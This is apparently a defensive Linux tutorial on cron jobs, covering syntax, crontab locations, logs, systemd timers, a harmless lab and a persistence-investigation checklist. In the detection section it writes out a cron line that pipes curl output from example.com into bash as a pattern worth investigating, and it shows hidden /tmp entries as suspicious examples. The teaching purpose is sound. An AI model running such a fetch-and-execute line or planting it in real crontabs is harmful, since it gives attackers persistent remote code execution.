# `11-Cron-Jobs.md`

# Linux Cron Jobs

## 1. First Principle

A **cron job** is a command or script that Linux runs automatically according to a schedule.

Instead of:

```text
Manually run script
      ↓
Every day
```

Cron does:

```text
Time arrives
    ↓
Cron checks schedule
    ↓
Command executes
    ↓
Output / logs
```

Examples:

- daily backups
- log cleanup
- database jobs
- monitoring scripts
- scheduled security checks

For cybersecurity, cron is important because attackers can abuse it for **persistence**.

---

# 2. Cron vs Process

A cron job is the **scheduled task**.

When the scheduled time arrives, it creates a **process**.

```text
Cron
 ↓
Scheduled command
 ↓
Process
 ↓
Program executes
```

---

# 3. Cron Service

Check the cron service:

```bash
systemctl status cron
```

On some distributions:

```bash
systemctl status crond
```

Cron must be running for scheduled jobs to execute.

---

# 4. Crontab

A user's scheduled jobs are stored in their **crontab**.

View your crontab:

```bash
crontab -l
```

Edit it:

```bash
crontab -e
```

Root's crontab:

```bash
sudo crontab -l
```

Important:

> Each user can have their own cron jobs.

---

# 5. Cron Syntax

Basic format:

```text
┌──────── minute
│ ┌────── hour
│ │ ┌──── day of month
│ │ │ ┌── month
│ │ │ │ ┌ day of week
│ │ │ │ │
* * * * * command
```

Five fields:

```text
minute
hour
day-of-month
month
day-of-week
```

---

# 6. Common Examples

Every minute:

```cron
* * * * * /path/script.sh
```

Every hour:

```cron
0 * * * * /path/script.sh
```

Every day at 2 AM:

```cron
0 2 * * * /path/script.sh
```

Every Sunday at 3 AM:

```cron
0 3 * * 0 /path/script.sh
```

Every 5 minutes:

```cron
*/5 * * * * /path/script.sh
```

---

# 7. Understanding `*`

`*` means:

> Every possible value for that field.

Example:

```cron
* * * * * command
```

means:

```text
Every minute
of every hour
of every day
of every month
regardless of weekday
```

---

# 8. Practical Example

Create a script:

```bash
nano ~/backup.sh
```

```bash
#!/bin/bash

date >> ~/backup.log
echo "Backup job executed" >> ~/backup.log
```

Make executable:

```bash
chmod +x ~/backup.sh
```

Add cron:

```bash
crontab -e
```

For testing:

```cron
*/5 * * * * /home/user/backup.sh
```

Every 5 minutes it adds a timestamp to:

```text
~/backup.log
```

Check:

```bash
cat ~/backup.log
```

---

# 9. Cron Environment

Cron does not always have the same environment as your interactive shell.

Therefore, this may fail:

```cron
*/5 * * * * python script.py
```

Prefer an absolute path:

```cron
*/5 * * * * /usr/bin/python3 /home/user/script.py
```

Likewise:

```cron
*/5 * * * * /usr/bin/bash /home/user/script.sh
```

This makes execution more predictable.

---

# 10. Redirect Cron Output

Cron jobs may produce output.

Save it:

```cron
0 2 * * * /home/user/backup.sh >> /home/user/backup.log 2>&1
```

Meaning:

```text
>> 
 ↓
Append normal output

2>&1
 ↓
Send errors to the same log
```

So both stdout and stderr go into:

```text
backup.log
```

---

# 11. Cron Locations

Common cron-related locations include:

```text
/etc/crontab
/etc/cron.d/
/etc/cron.hourly/
/etc/cron.daily/
/etc/cron.weekly/
/etc/cron.monthly/
```

Inspect:

```bash
ls -lah /etc/cron.d/
```

And:

```bash
cat /etc/crontab
```

---

# 12. Cybersecurity Importance

Attackers can use cron for **persistence**.

Example attack pattern:

```text
Attacker gains access
       ↓
Creates malicious script
       ↓
Adds cron job
       ↓
Script executes periodically
       ↓
Access survives
```

Example suspicious entry:

```cron
*/10 * * * * /tmp/.update
```

This deserves investigation, especially if:

- the file is hidden
- it is in `/tmp`
- it runs as root
- nobody knows who created it
- it connects to an external server

The cron entry alone is **not proof of malware**.

---

# 13. Investigating User Cron Jobs

List current user's jobs:

```bash
crontab -l
```

Check root:

```bash
sudo crontab -l
```

Check other cron locations:

```bash
cat /etc/crontab
```

```bash
ls -lah /etc/cron.d/
```

Also inspect:

```bash
ls -lah /etc/cron.daily/
```

---

# 14. Suspicious Cron Investigation

Suppose you find:

```cron
*/15 * * * * /tmp/.system-update
```

Don't immediately delete it.

First investigate:

### Step 1 — Check the file

```bash
ls -la /tmp/.system-update
```

### Step 2 — Identify file type

```bash
file /tmp/.system-update
```

### Step 3 — Calculate hash

```bash
sha256sum /tmp/.system-update
```

### Step 4 — Inspect safely

```bash
less /tmp/.system-update
```

### Step 5 — Check permissions

```bash
stat /tmp/.system-update
```

### Step 6 — Check process/network activity

```bash
ps aux
```

```bash
ss -tnp
```

Mental model:

```text
Cron Entry
    ↓
Script
    ↓
Process
    ↓
Files
    ↓
Network
```

---

# 15. Cron + Persistence Detection

Look for jobs that:

```text
Run frequently
     +
Execute from unusual directories
     +
Run as privileged users
     +
Use hidden filenames
     +
Download or execute remote content
```

For example, this deserves investigation:

```cron
*/5 * * * * curl http://example.com/x | bash
```

Why?

```text
curl
 ↓
Downloads remote content
 ↓
bash
 ↓
Executes it
```

This is a dangerous pattern because code is being fetched and executed dynamically.

---

# 16. Cron Logs

Depending on the Linux distribution, cron activity may appear in:

```bash
journalctl
```

Try:

```bash
journalctl -u cron
```

or:

```bash
journalctl -u crond
```

You can also search:

```bash
grep -i cron /var/log/syslog
```

On some systems:

```bash
grep -i cron /var/log/cron
```

---

# 17. Practical Security Audit Script

```bash
#!/bin/bash

echo "===== CURRENT USER CRON ====="
crontab -l 2>/dev/null

echo
echo "===== ROOT CRON ====="
sudo crontab -l 2>/dev/null

echo
echo "===== SYSTEM CRONTAB ====="
cat /etc/crontab

echo
echo "===== CRON.D ====="
ls -lah /etc/cron.d/

echo
echo "===== CRON DAILY ====="
ls -lah /etc/cron.daily/
```

This provides a quick inventory of scheduled tasks.

---

# 18. Cron vs systemd Timers

Modern Linux systems may also use **systemd timers**.

Check:

```bash
systemctl list-timers
```

Example:

```text
NEXT
LEFT
LAST
UNIT
```

Think:

```text
Cron
 ↓
Traditional scheduled tasks

systemd timer
 ↓
Modern systemd-based scheduling
```

As a cybersecurity analyst, you should check **both**.

---

# 19. Practical Lab

Create a test cron job.

```bash
nano ~/cron-test.sh
```

Add:

```bash
#!/bin/bash

echo "Cron executed at $(date)" >> ~/cron-test.log
```

Make executable:

```bash
chmod +x ~/cron-test.sh
```

Edit cron:

```bash
crontab -e
```

Add:

```cron
*/5 * * * * /home/YOUR_USER/cron-test.sh
```

Wait a few minutes.

Check:

```bash
cat ~/cron-test.log
```

Remove the test entry afterward:

```bash
crontab -e
```

This teaches the complete flow:

```text
Schedule
 ↓
Cron
 ↓
Script
 ↓
Process
 ↓
Log
```

---

# 20. Important Commands

```bash
# User cron
crontab -l
crontab -e

# Root cron
sudo crontab -l

# System cron
cat /etc/crontab
ls -lah /etc/cron.d/

# Cron service
systemctl status cron
systemctl status crond

# Cron logs
journalctl -u cron
journalctl -u crond

# Systemd timers
systemctl list-timers
```

---

# 21. Interview Questions

### Q1. What is cron?

A Linux scheduling mechanism for automatically executing commands at specified times.

### Q2. What does this mean?

```cron
0 2 * * *
```

It runs at:

```text
02:00
Every day
```

### Q3. Difference between cron and systemd timer?

Cron is a traditional scheduling mechanism; systemd timers integrate scheduling with systemd services and provide additional system-management features.

### Q4. Why is cron important in cybersecurity?

Because attackers can use scheduled tasks to maintain persistence or repeatedly execute malicious commands.

### Q5. How would you investigate a suspicious cron job?

```text
Find cron entry
     ↓
Identify script
     ↓
Check owner/permissions
     ↓
Inspect file
     ↓
Hash file
     ↓
Check process
     ↓
Check network
     ↓
Check logs
```

---

# 22. Quick Cheat Sheet

```bash
crontab -l
crontab -e
sudo crontab -l

cat /etc/crontab
ls -lah /etc/cron.d/

systemctl list-timers

journalctl -u cron
journalctl -u crond
```

Common syntax:

```text
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week
│ │ │ └──── Month
│ │ └────── Day of month
│ └──────── Hour
└────────── Minute
```

## Core Mental Model

```text
Scheduled Task
      ↓
Cron / systemd timer
      ↓
Command / Script
      ↓
Process
      ↓
Files + Network + Privileges
      ↓
Logs
```

For a **Cybersecurity Analyst**, always remember:

> **Scheduled tasks are both an administrative mechanism and a potential persistence mechanism.**

**Next:** `12-Linux-Security-Hardening.md`